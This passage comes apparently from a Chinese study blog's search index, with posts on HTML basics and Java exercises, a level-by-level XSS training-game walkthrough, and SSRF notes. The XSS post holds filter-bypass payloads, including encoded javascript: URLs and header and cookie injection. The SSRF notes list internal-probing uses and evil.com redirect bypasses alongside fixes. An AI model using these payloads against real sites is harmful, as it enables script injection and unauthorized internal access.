alt=&quot;somr_text&quot;&gt;\nURL时图片的存储位置。如果名字是”logo.png”，那么他就是位于www.example.com的images目录下，实际上也就是URL的https://www.example.com/images/pulpit.jpg\n浏览器将图像显示在文档中图像标签的位置。\nAlt属性alt是用来为图像定义一串预备可替换文本。在浏览器无法载入图像时，替换文本属性告诉读者她们失去的信息。此时，浏览器将显示这个替代性的文本而不是图像。为页面上的图像都加上替换文本属性是个好习惯，这样有助于更好的显示信息，并且对于那些使用纯文本浏览器的人来说是非常有用的。\n还是很好用的，可以提升用户体验。\n设置高度和宽度高度和宽度属性用于设置图像的高度和宽度。\n属性值的默认单位是像素px\n&lt;img src=\"pulpit.jpg\" alt=\"Pulpit rock\" width=\"304\" height=\"228\">\n\n设置高度和宽度是个好习惯，设置了HTML解析时就会预留空间给图像，不然有时候可能会破坏了HTML页面的布局。\n图像映射&lt;img src=\"planets.gif\" width=\"145\" height=\"126\" alt=\"Planets\" usemap=\"#planetmap\">//使用图像地图\n\n&lt;map name=\"planetmap\">//定义图像地图\n  &lt;area shape=\"rect\" coords=\"0,0,82,126\" alt=\"Sun\" href=\"sun.htm\">//定义图像地图中的可点击区域\n  &lt;area shape=\"circle\" coords=\"90,58,3\" alt=\"Mercury\" href=\"mercur.htm\">\n  &lt;area shape=\"circle\" coords=\"124,58,8\" alt=\"Venus\" href=\"venus.htm\">\n&lt;/map>\n\n1、矩形：(左上角顶点坐标为(x1,y1)，右下角顶点坐标为(x2,y2))\n&lt;area shape=\"rect\" coords=\"x1,y1,x2,y2\" href=url>\n\n2、圆形：(圆心坐标为(X1,y1)，半径为r)\n&lt;area shape=\"circle\" coords=\"x1,y1,r\" href=url>\n\n3、多边形：(各顶点坐标依次为(x1,y1)、(x2,y2)、(x3,y3) ……)\n&lt;area shape=\"poly\" coords=\"x1,y1,x2,y2 ......\" href=url>\n\nHTML表格表格由 &lt;table&gt; 标签来定义。每个表格均有若干行（由 &lt;tr&gt; 标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。\n边框属性如果不定义边框属性，表格将不显示边框。有时这很有用，但是大多数时候，还是显示边框好。\n//有边框的\n&lt;table border=\"1\">\n    &lt;tr>\n        &lt;td>Row 1, cell 1&lt;/td>\n        &lt;td>Row 1, cell 2&lt;/td>\n    &lt;/tr>\n&lt;/table>\n//无边框的\n&lt;table border=\"0\">\n    &lt;tr>\n        &lt;td>Row 1, cell 1&lt;/td>\n        &lt;td>Row 1, cell 2&lt;/td>\n    &lt;/tr>\n&lt;/table>\n\n表头表格的表头使用&lt;th&gt;标签进行定义。\n大多数浏览器会居中加粗表头文本。\n&lt;table border=\"1\">\n    &lt;tr>\n        &lt;th>Header 1&lt;/th>\n        &lt;th>Header 2&lt;/th>\n    &lt;/tr>\n    &lt;tr>\n        &lt;td>row 1, cell 1&lt;/td>\n        &lt;td>row 1, cell 2&lt;/td>\n    &lt;/tr>\n    &lt;tr>\n        &lt;td>row 2, cell 1&lt;/td>\n        &lt;td>row 2, cell 2&lt;/td>\n    &lt;/tr>\n&lt;/table>\n\n标题表格标题可以用&lt;caption&gt;标签进行定义。\n&lt;table border=\"1\">\n  &lt;caption>Monthly savings&lt;/caption>\n  &lt;tr>\n    &lt;th>Month&lt;/th>\n    &lt;th>Savings&lt;/th>\n  &lt;/tr>\n  &lt;tr>\n    &lt;td>January&lt;/td>\n    &lt;td>$100&lt;/td>\n  &lt;/tr>\n  &lt;tr>\n    &lt;td>February&lt;/td>\n    &lt;td>$50&lt;/td>\n  &lt;/tr>\n&lt;/table>\n\n嵌套表格中可以嵌套入其他元素，比如说可以嵌入段落，嵌入列表，嵌入表格，都是可以的。\nHTML列表HTML支持有序、无序和定义列表：\nHTML无序列表无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。无序列表使用 &lt;ul&gt; 标签。\n&lt;ul>\n&lt;li>Coffee&lt;/li>\n&lt;li>Milk&lt;/li>\n&lt;/ul>\n\nHTML有序列表同样，有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 &lt;ol&gt; 标签。每个列表项始于&lt;li&gt;标签。列表项使用数字来标记。\n&lt;ol>\n&lt;li>Coffee&lt;/li>\n&lt;li>Milk&lt;/li>\n&lt;/ol>\n\nHTML 自定义列表自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以&lt;dd&gt;开始。\n&lt;dl>\n&lt;dt>Coffee&lt;/dt>\n&lt;dd>- black hot drink&lt;/dd>\n&lt;dt>Milk&lt;/dt>\n&lt;dd>- white cold drink&lt;/dd>\n&lt;/dl>\n\n 注意：列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。\n","slug":"HTML基础学习-三","date":"2020-05-29T02:17:34.000Z","categories_index":"HTML学习","tags_index":"HTML","author_index":"A1andNS"},{"id":"05866ee6f7d2a8def18bbf6cc1113b89","title":"HTML基础学习(二)","content":"今天继续学习HTML。\nHTML元素之前说到过HTML元素是标签加上内容够成的。而HTML文档是由标签来写的，也就是元素构成。\nHTML元素的语法\nHTML 元素以开始标签起始，比如&lt;p&gt;\nHTML 元素以结束标签终止，比如&lt;/p&gt;\n元素的内容是开始标签与结束标签之间的内容\n某些 HTML 元素具有空内容\n空元素在开始标签中进行关闭（以开始标签的结束而结束），比如&lt;br&gt;之类的。\n大多数 HTML 元素可拥有属性\n\nHTML元素嵌套在HTML中经常出现元素套元素的情况。随便一个HTML网页都有，比如一个简单例子：\n&lt;!DOCTYPE html>\n&lt;html>\n    &lt;body>\n        &lt;p>\n            this is a paragraph.\n        &lt;/p>\n    &lt;/body>\n&lt;/html>\n\n这是&lt;p&gt;元素：\n&lt;p>//开始标签\n    this is a paragraph.\n&lt;/p>//结束标签\n它被嵌套在&lt;body&gt;元素中\n&lt;body>\n    &lt;p>\n        this is a paragraph.\n    &lt;/p>\n&lt;/body>\n而&lt;body&gt;又作为元素内容嵌套在&lt;html&gt;中。\n结束标签问题有时候在编写代码时，漏掉了结束标签，但是依旧可以实现网页查看。这是因为大多数的浏览器都会处理，使其可以显示但是这是一个不好的做法，可能产生兼容性问题。所以要尽量避免，以免产生错误。\n//这不是一个好的做法\n&lt;!DOCTYPE html>\n&lt;html>\n    &lt;p>this is a bad idea!!!\n&lt;/html>\n\n\nHTML空元素没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。\n&lt;br&gt; 就是没有关闭标签的空元素（&lt;br&gt; 标签定义换行）。\n在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。\n在开始标签中添加斜杠，比如 &lt;br /&gt;，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。\n即使 &lt;br&gt; 在所有浏览器中都是有效的，但使用 &lt;br /&gt; 其实是更长远的保障。\n所以最好使用&lt;br /&gt;来替代&lt;br&gt;\nHTML标签最好用小写，虽然HTML对大小写不敏感，但是W3C时建议使用小写的，所以最好使用小写来编写HTML标签。像XHTML就是强制使用小写的。\nHTML属性属性是HTML元素提供的附加信息。\n\nHTML 元素可以设置属性\n属性可以在元素中添加附加信息\n属性一般描述于开始标签\n属性总是以名称/值对的形式出现，**比如：name=”value”**。\n\n示例&lt;a href=\"https://a1andns.github.io\">this is a link&lt;/a>\n\n这里的HTML链接就是&lt;a&gt;标签定义的，链接地址就在href属性中定义。可以看到name=”value”结构的属性，大多数时候是使用的双引号，但是使用单引号也是可以的。但是注意：有时候属性的值本身就是带有&quot;&quot;号的，就要用&#39;&#39;了。前面提到了标签最好用小写，这里也一样属性最好也是用小写。\n比较通用的属性有class、id、style、title等。属性很多可以上网查找相应的属性使用。\n比如说这个链接\nHTML段落HTML可以把文档进行分割，搞成多个段落。段落是用&lt;p&gt;来实现的。浏览器在段落于段落之间会自动空行，以区分。如果想要在不起新行的情况下进行换行，就要使用&lt;br&gt;，最好是&lt;br /&gt;。\n比如说\n&lt;p>this&lt;br>paragraph&lt;br>show the result&lt;/p>\n\nHTML输出问题我们无法确定 HTML 被显示的确切效果。屏幕的大小，以及对窗口的调整都可能导致不同的结果。\n对于 HTML，您无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。\n当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格。\n所以换行要用&lt;br /&gt;来实现，文本上的格式不一定就是显示格式。\n文本格式化HTML格式化标签HTML 使用标签&lt;b&gt;(&quot;bold&quot;)与 &lt;i&gt;(&quot;italic&quot;) 对输出的文本进行格式, 如：粗体 or 斜体。这个和很符合用户习惯的写法，用过word都知道ctrl+B就是粗体，而Ctrl＋I就是斜体了。\n注意：通常标签 &lt;strong&gt; 替换加粗标签 &lt;b&gt; 来使用, &lt;em&gt; 替换 &lt;i&gt;标签使用。\n&lt;b&gt; 与&lt;i&gt; 定义粗体或斜体文本。\n&lt;strong&gt; 或者 &lt;em&gt;意味着你要呈现的文本是重要的，所以要突出显示。\n所以其实是有含义的，看情况使用了。\n参考：\n\n\n标签\n描述\n\n\n&lt;b&gt;\n定义粗体文本\n\n\n&lt;em&gt;\n定义着重文字\n\n\n&lt;i&gt;\n定义斜体字\n\n\n&lt;small&gt;\n定义小号字\n\n\n&lt;strong&gt;\n定义加重语气\n\n\n&lt;sub&gt;\n定义下标字\n\n\n&lt;sup&gt;\n定义上标字\n\n\n&lt;ins&gt;\n定义插入字\n\n\n&lt;del&gt;\n定义删除字\n\n\n\nHTML”计算机输出”标签&lt;pre&gt;预格式处理之前说排版问题，文本里的空格会被无情的变成一个。而使用预处理的话，我们的排版就可以实现，它对空行和空格进行控制空行和空格进行控制。\n&lt;pre>\n窗前明月光，\n\n疑似地上霜。\n\n举头望明月，\n\n低头思故乡。\n&lt;/pre>\n\n\n还有一些其他的标签，如下所示：\n参考\n\n\n标签\n描述\n\n\n&lt;code&gt;\n定义计算机代码\n\n\n&lt;kbd&gt;\n定义键盘码\n\n\n&lt;samp&gt;\n定义计算机代码样本\n\n\n&lt;var&gt;\n定义变量\n\n\n&lt;pre&gt;\n定义预格式文本\n\n\n\nHTML 引文, 引用, 及标签定义&lt;address&gt;标签用来描写地址，看例子：\n&lt;address>\nWritten by &lt;a href=\"mailto:webmaster@example.com\">A1andNS&lt;/a>.&lt;br> \nVisit us at:&lt;br>\nExample.com&lt;br>\nBox 564, Disneyland&lt;br>\nUSA\n&lt;/address>\n\n&lt;abbr&gt;缩写标签示例：\n&lt;abbr title=\"etcetera\">etc.&lt;/abbr>\n&lt;br />\n//这两个标签是一样的作用\n&lt;acronym title=\"World Wide Web\">WWW&lt;/acronym>\n\n你可以写&lt;abbr&gt;或&lt;acronym&gt;，在某些浏览器中，当您把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。仅对于 IE 5 中的 acronym 元素有效。对于 Netscape 6.2 中的 abbr 和 acronym 元素都有效。但是现在IE已经退役了，基本可以不考虑这种因素，主要还是看主流如何支持了。\n&lt;bdo&gt;标签&lt;p>&lt;bdo dir=\"rtl\">该段落文字从右到左显示。&lt;/bdo>&lt;/p>\n\ndir属性的rtl值就是从右开始。这里也有一个嵌套，&lt;bdo&gt;标签在&lt;p&gt;元素内容位置。\n参考标签：\n\n\n标签\n描述\n\n\n&lt;abbr&gt;\n定义缩写\n\n\n&lt;address&gt;\n定义地址\n\n\n&lt;bdo&gt;\n定义文字方向\n\n\n&lt;blockquote&gt;\n定义长的引用\n\n\n&lt;q&gt;\n定义短的引用语\n\n\n&lt;cite&gt;\n定义引用、引证\n\n\n&lt;dfn&gt;\n定义一个定义项目。\n\n","slug":"HTML基础学习-二","date":"2020-05-28T13:49:08.000Z","categories_index":"HTML学习","tags_index":"HTML","author_index":"A1andNS"},{"id":"2475ee616ecc49e64c3b48cdf44376ee","title":"JAVA之File练习","content":"题目编写一个Java源程序，其中包含：\n编写一个包含主方法main的公共类（访问权限为public的类），主方法main中完成的任务是：\n（1）从键盘上输入两个文件的路径名及其文件名。\n（2）从键盘上输入若干学生的信息（姓名，数学成绩，计算机成绩，各项之间用空格隔开），以finish结束，将这些学生的信息写入第一个文件。\n（3）将第一个文件作为输入流的源，找出姓“张”的学生，将他们的信息写入第二个文件。\n环境\n\n\n\n\n\n\n\n\n系统：Windows10 1909\nJava：Java 1.8\nIDE：IDEA 2020.1\n源代码import java.io.*;\nimport java.util.ArrayList;\nimport java.util.Iterator;\nimport java.util.LinkedList;\nimport java.util.Scanner;\n\npublic class FilePractice &#123;\n   public static void main(String[] args) throws IOException &#123;\n       Scanner scan = new Scanner(System.in);\n       System.out.println(\"请输入第一个文件的路径和名称：\");\n       File file1 = new File(scan.next());\n       System.out.println(\"请输入第二个文件的路径和名称：\");\n       File file2 = new File(scan.next());\n       write(file1);\n       read_write(file1,file2);\n   &#125;\n\n   public static void write(File file1) throws IOException &#123;//写入信息到第一个文件，用字节流输入输出\n       LinkedList&lt;String> student = new LinkedList&lt;String>();//双向列表\n       Scanner scan = new Scanner(System.in);\n       System.out.println(\"第一个文件存放学生的姓名，数学成绩和计算机成绩，各项之间用空格间隔。\");\n       System.out.println(\"\\n请向第一个文件输入内容，并且以finish结束：\");\n       String content = scan.nextLine();\n       while (!content.equals(\"finish\"))&#123;\n           student.add(content);\n           content = scan.nextLine();\n       &#125;\n       Iterator&lt;String> it = student.iterator();\n       FileOutputStream fileOutputStream = new FileOutputStream(file1);\n       while(it.hasNext())&#123;\n           byte[] b = it.next().getBytes();\n           fileOutputStream.write(b);\n           fileOutputStream.write((int)'\\n');\n       &#125;\n       fileOutputStream.close();\n   &#125;\n\n   public static void read_write(File file1,File file2) throws IOException &#123;//读第一个文件并且写入第二个文件，用了字符流结合字符缓冲流来进行。\n       ArrayList&lt;String > list = new ArrayList&lt;String>();//引入列表对象\n       FileReader fileReader = new FileReader(file1);\n       FileWriter fileWriter = new FileWriter(file2);\n       BufferedReader bufferedReader = new BufferedReader(fileReader);\n       BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);\n       String content = new String();\n       while ((content = bufferedReader.readLine())!=null)&#123;//逐行筛选内容，这里是\"张\"开头的，添加到之前的list里面\n           if(content.startsWith(\"张\"))&#123;\n               list.add(content);\n           &#125;\n       &#125;\n       Iterator&lt;String > it = list.iterator();//这里用到了iterator迭代器对list进行迭代\n       while (it.hasNext())&#123;\n           bufferedWriter.write(it.next());\n           bufferedWriter.write('\\n');\n       &#125;\n        bufferedWriter.close();\n        fileWriter.close();\n        bufferedReader.close();\n        fileReader.close();\n\n       System.out.println(\"\\n第一个文件中姓”张”的学生的信息已经存放入第二个文件，请到其存放路径查阅！\");\n   &#125;\n&#125;\n\n运行效果\n\n","slug":"JAVA之File学习","date":"2020-05-28T00:34:33.000Z","categories_index":"Java学习","tags_index":"Java","author_index":"A1andNS"},{"id":"e2737fbb24bd27a9f4ebebdd23c4095f","title":"HTML基础","content":"HTML文档的后缀名\n.html\n.htm\n\nHTML标签&lt;标签&gt;内容&lt;/标签&gt;这是HTML的标准格式了，用标签来书写。\nHTML元素一个 HTML 元素包含了开始标签与结束标签，如下实例:\nHTML 元素:\n&lt;p>这是一个段落。&lt;/p>\n\nHTML 网页结构下面是一个可视化的HTML页面结构：\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;页面标题&lt;/title&gt;\n\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;h1&gt;这是一个标题&lt;/h1&gt;\n&lt;p&gt;这是一个段落。&lt;/p&gt;\n&lt;p&gt;这是另外一个段落。&lt;/p&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n\n\n白色部分是网页可见的内容。\n&lt;!DOCTYPE&gt; 声明这个在看网页源码时经常可以看到的。&lt;!DOCTYPE&gt;声明有助于浏览器中正确显示网页。\n网络上有很多不同的文件，如果能够正确声明HTML的版本，浏览器就能正确显示网页内容。\ndoctype 声明是不区分大小写的，以下方式均可：\nHTML5\n&lt;!DOCTYPE html>\n\nHTML 4.01\n&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n\nXHTML 1.0\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n\n更多可以上网查询一下，主要还是为了让浏览器可以更好的解析网页的存在。\n中文编码为了浏览器解析中文时稳定不乱码，最好要在HTML头部添加字符声明问UTF-8或GBK。\n&lt;!DOCTYPE html>\n&lt;html>\n\t&lt;head>\n\t\t&lt;meta charset=\"UTF-8\">\n\t\t&lt;title>页面标题&lt;/title>\n\t&lt;/head>\n&lt;/html>\n\n编辑器编辑器有很多都可以做HTML编程。比如IDEA，PHPStom以及VSCode我都觉得挺好用的，VSCode可能会更轻量点。个人推荐VSCode、IDEA，PHPStom。PHP和HTML的关系所以可能有些时候PHPStom确实很好用。\nHTML标题HTML标题时通过&lt;h1&gt;-&lt;h6&gt;标签来定义的\n&lt;h1>first&lt;/h1>\n&lt;h2>second&lt;/h2>\n&lt;h3>third&lt;/h3>\n\nHTML段落HTML段落时通过标签&lt;p&gt;来定义的\n&lt;p>this is a paragraph&lt;/p>\n&lt;p>this is another paragraph&lt;/p>\n\nHTML链接HTML链接时通过使用标签&lt;a&gt;来实现的\n&lt;a href=\"https://a1andns.github.io\">this is a link&lt;/a>\n\nHTML图像HTML图像是通过&lt;img&gt;标签来实现的\n&lt;img src=\"logo.png\" width=\"258\" height=\"39\" />\n\n","slug":"HTML基础","date":"2020-05-27T02:18:43.000Z","categories_index":"HTML学习","tags_index":"HTML","author_index":"A1andNS"},{"id":"78d694166ceafa715bcdb2c1afc2ef78","title":"XSS挑战之旅","content":"无意间看到了一个XSS小游戏，就玩了一下。\n链接：https://xss.tesla-space.com/\nlevel1看显示的界面和url，可以知道name参数是一个关键，我试着再name参数写入一个脚本。\nname=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;，这就直接过关了，看来只要能够让脚本得到运行就可以过关。\n\nlevel2\n没有成功弹窗，所以要想办法把脚本剥离出来，那就要把value和input先闭合了才行。\n\n用1&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;，闭合value和input。\n过关!!!\nlevel3可以用&#39;来闭合value，但是&gt;被转义了，无法闭合input。\n\n那就加一个onclick来搞，1&#39; onclick=alert(1)\n\n1&#39; onclick=alert(1)//把后面的东西注释掉。\n\nlevel4和上一关一样的过滤了&lt;、&gt;，双引号可以闭合value，但是input没法闭合，那就在用一下上一关的办法看看。\n一样的操作过关。\n1&quot; onclick=alert(1)//\n\nlevel5这回想要直接搞失败了，过滤了onclick，但是这次没有过滤&gt;，&lt;。\n\n试一下script，结果被过滤了，那就只能另辟蹊径了。\n\n使用&lt;a&gt;标签，这个没有被过滤。\npayload：1&quot;&gt;&lt;a href=&quot; javascript:alert(1)&quot;\n\nlevel6试了一下&quot;、&gt;没有被过滤，script依旧被过滤了，onclick也是一样被过滤。\n\nhref也已经被过滤了。\n\n但是可以大小写绕过，这里考察的就是大小写绕过，这是因为使用str_replace()函数。\npayload：1&quot;&gt;&lt;a HREF=&quot;javascript:alert(1)&quot;\n\nlevel7经过尝试onclick，script，href都被过滤了，并且使用空格替换，所以考虑使用单词嵌套绕过。\n\n\n过关，这里主要考察的就是嵌套单词绕过方法。\nlevel8经过尝试发现&gt;被过滤了，那就试试用onclick方法，onclick方法被过滤。发现关键在于输入内容会被加入到href中。\n\n试一下javascript:alert(1)发现script被过滤，试一下大小写绕过。发现行不通。那就考虑一下能不能用编码的方式绕过。\n\n这里我用来HEX编码，\npayload：&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;\n\n\nlevel9&gt;被过滤，试一试onclick没有成功。\n看来一下href处提示连接不合法。\n试了一下输入http://1&quot; onclick=alert(1)//,发现href处有了，那么可能是要有http存在，试一下放到尾巴。\n\n发现是可以的，\n\n但是javascript被过滤了，大小写无法绕过。看来是要编码了。那么就构造payload吧！\npayload：&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&#x2F;&#x2F;http:&#x2F;&#x2F;\n\n#这里http不能一起编码，不然系统会认为没有http变成非法的连接了。\n\n\n也可以使用%09换行符绕过。\npayload：\njavascr%09ipt:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;\n\n\n\nleve10没有输入框了。\n\n但是发现有隐藏Form。\n\n发现https://xss.tesla-space.com/level10.php?t_link=123&amp;t_history=123&amp;t_sort=123后，自由t_sort的value发生变化，所以注入点实在t_sort。\n\n那么构造payload：\nhttps://xss.tesla-space.com/level10.php?keyword=1&amp;t_sort=1%22%20type=%22text%22%20onclick=alert(1)//\n\n\n成功过关！！\nlevel11和上关一样发现了隐藏表单，那就试试看了\n\n和上题一样应该是在t_sort位置。但是视乎不可以，输入的内容会被转换处理，无法插入。\n\n看来应该是利用t_ref来搞吧，要用HTTP头部来入。Hackbar就可以搞了。\n\npayload：\nReferer: 1&quot; type&#x3D;text onclick&#x3D;alert(1)&#x2F;&#x2F;\n\n\n过关！！！\nlevel12一种直觉，注入点在UA，所以二话不说，搞他。\n\npayload见图片：\n\n\n成功通关！！！\nlevel13看这个的意识应该是cookie处做文章。\n\n先看看cookie格式，我用hackbar没有操作成功，那就只能用burp了。\n\npayload：\nCookie: __cfduid&#x3D;dc935a1563940f4dc6ca2f94c7daec3611590568925; user&#x3D;1&quot;+type&#x3D;text+onclick&#x3D;alert(1)&#x2F;&#x2F;\n\n\n通关\nlevel14这题org没打开，就只能跳过了，查了一下是考察exifXSS\nlevel15有一个ng-include:，这个类似PHP里面的include，所以考虑包含。\n\npayload：\n?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;\n\nchrome访问是以注释显示ngInclude未定义，而Firefox访问是有的。\n\n\n感觉有点坑，结果还是Firefox打不通，chrome可以打通。有点迷。\n\n通关\nlevel16script被过滤了，考虑其他方法。试一下&lt;img的办法。\n\npayload：\n?keyword&#x3D;&lt;img%20src&#x3D;1%20onerror&#x3D;alert(1)&gt;\n\n发现空额被过滤了，用%0a来绕过\npayload:\n?keyword&#x3D;&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;\n\n\n通关！！！\nlevel17一个flash组件，它是在&lt;embed&gt;标签里的而url传入内容会被加到embed的src里，所以直接在url处写入一个东西来执行脚本，用onmouseover=alert(1),就可以了。还可以用onmousemove=alert(1)、onmousedown=alert(1)、onmouseout=alert(1)、onmouseup=alert(1)、onmousewheel=alert(1)、onekeydown=alert(1)、onkeypress=alert(1)、onkeyup=alert(1)都是可以的。\n\n过关！！\nlevel18和上一题一样，我还是用了onmouseover=alert(1)\n\n通关！！！\n","slug":"XSS挑战之旅","date":"2020-05-27T01:02:16.000Z","categories_index":"学习笔记","tags_index":"XSS","author_index":"A1andNS"},{"id":"d422db4ec62375a9a1399b6a63a1e320","title":"SSRF学习","content":"SSRF概念SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）\n这也是因为在处理参数的时候，服务器端没有验证参数的合法性，从而导致可以利用服务器端为跳板去获取内网服务器信息。\nSSRF用途那么SSRF 可以做什么呢？\n1.内外网的端口和服务扫描\n2.主机本地敏感数据的读取\n3.内外网主机应用程序漏洞的利用\n4.内外网Web站点漏洞的利用\nSSRF漏洞经常出现的位置调用资源的参数就很有可能会出现ssrf漏洞。\n1.社交分享功能：获取超链接的标题等内容进行显示\n2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览\n3.在线翻译：给网址翻译对应网页的内容\n4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片\n5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验\n6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试\n7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作\n8.数据库内置功能：数据库的比如mongodb的copyDatabase函数\n9.邮件系统：比如接收邮件服务器地址\n10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等\n11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞\n一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……\n12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）\n经常会看到SSRF时有RFI导致的，也就是远程文件包含，文件包含的目的是：开发程序的时候经常会吧需要重复使用的代码写入一个单独的文件中，当需要调用这些代码事，再从其他文件中包含调用代码就好了。\nPHP中常见的包含调用函数有：include()、require()、include_once、require_once() 。其中include失败会弹出警告，require失败则是直接导致致命错误。当然一般可能还需要php.ini文件中开启了allow_url_fopen allow_url_include才行。\nSSRF利用1.让服务端去访问相应的网址\n2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms\n3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件\n4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）\n5.攻击内网应用程序（利用跨协议通信技术）\n6.判断内网主机是否存活：方法是访问看是否有端口开放\n7.DoS攻击（请求大文件，始终保持连接keep-alive always）\n绕过小技巧注：参考[8]会有更详细的绕过方式总结\n1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的\n2.各种IP地址的进制转换\n3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/\n4.短网址绕过 http://t.cn/RwbLKDx\n5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）\n指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)\n6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80\n7.探测内网域名，或者将自己的域名解析到内网ip\n8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，\n但这样可以用 http://abc@10.153.138.81/ 绕过\n漏洞修复1.禁止跳转\n2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题\n4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）\n5.限制请求的端口为http常用的端口，比如 80、443、8080、8090\n6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。\n常见bypass方式：a. 单斜线”/“绕过\nhttps://www.xxx.com/redirect.php?url=/www.evil.com\nb. 缺少协议绕过\nhttps://www.xxx.com/redirect.php?url=//www.evil.com\nc. 多斜线”/“前缀绕过\nhttps://www.xxx.com/redirect.php?url=///www.evil.com\nhttps://www.xxx.com/redirect.php?url=www.evil.com\nd. 利用”@”符号绕过\nhttps://www.xxx.com/redirect.php?url=https://www.xxx.com@www.evil.com\ne. 利用反斜线”&quot;绕过\nhttps://www.xxx.com/redirect.php?url=https://www.evil.com\\https://www.xxx.com/\nf. 利用”#”符号绕过\nhttps://www.xxx.com/redirect.php?url=https://www.evil.com#https://www.xxx.com/\ng. 利用”?”号绕过\nhttps://www.xxx.com/redirect.php?url=https://www.evil.com?www.xxx.com\nh. 利用”\\“绕过\nhttps://www.xxx.com/redirect.php?url=https://www.evil.com\\\\www.xxx.com\ni. 利用”.”绕过\nhttps://www.xxx.com/redirect.php?url=.evil     \nhttps://www.xxx.com/redirect.php?url=.evil.com \nj.重复特殊字符绕过\nhttps://www.xxx.com/redirect.php?url=///www.evil.com//..\nhttps://www.xxx.com/redirect.php?url=www.evil.com//..\n​    其他常见的绕过方式还有，使用地址，而不是域名；使用跳转到IPV6地址，而不是IPv4地址；用10进制、8进制、16进制形式表示；更换协议,使用ftp、gopher协议等；\n参考资料[1] . https://xz.aliyun.com/t/2115\n","slug":"SSRF学习","date":"2020-05-20T02:09:59.000Z","categories_index":"学习笔记","tags_index":"SSRF","author_index":"A1andNS"},{"id":"29d2db0c129aae9d00581e94f50e8afb","title":"Java代码练习之抽象类和接口","content":"今天写了两题Java练习题\n题目一有一个抽象类ObjectVolume，如下所示：\n\nabstract class ObjectVolume\n\n&#123;\n\n    abstract double getVolume(); //返回物体的体积\n\n&#125;\n\n（1）编写球体类，立方体类和圆柱体类，它们是抽象类ObjectVolume的子类。（提示：想一想，这些子类除了要实现父类的抽象方法，也就是计算各自的体积之外，这些子类各自的成员变量什么？）\n\n（2）编写一个public类，其中包含main方法和static void get(ObjectVolume 